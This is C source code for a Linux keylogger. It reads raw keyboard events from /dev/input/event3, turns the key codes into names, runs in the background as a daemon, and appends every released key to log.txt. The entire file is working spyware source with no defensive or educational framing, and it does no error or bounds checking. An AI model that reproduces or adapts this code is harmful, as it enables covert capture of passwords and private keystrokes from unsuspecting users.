#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include "daemonize.c"

//The keyboard open varies from OS to OS - it might be event2 or event3

#define EVENTNUMBER "/dev/input/event3"

static const char *teclado[] = //Codigos obtenidos de /usr/include/linux/input-event-codes.h
{
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
    "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
    "SCROLL_LOCK", "NUMPAD_7", "NUMPAD_8", "NUMPAD_9", "-", "NUMPAD_4", "NUMPAD_5",
    "NUMPAD_6", "+", "NUMPAD_1", "NUMPAD_2", "NUMPAD_3", "INS", "DEL", "ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT",
    "F11", "F12", "ALTLAYOUT", "ALTLAYOUT",    "ALTLAYOUT", "ALTLAYOUT",    "ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT", "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", "ALTLAYOUT", "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",    "PAGE_DOWN", "INSERT", "DELETE", "ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT","ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT", 
    "PAUSE"
};

int main(int argc, char **argv)
{
    struct input_event ev;
    int keyboard = open(EVENTNUMBER, O_RDONLY);
    FILE *fp = fopen("log.txt", "a");
    daemonize();
    while (1)
    {
        read(keyboard, &ev, sizeof(ev));
        if ((ev.type == EV_KEY) && (ev.value == 0))
        {
            fprintf(fp, "%s\n", teclado[ev.code]);
            fflush(fp);
        }
    }
}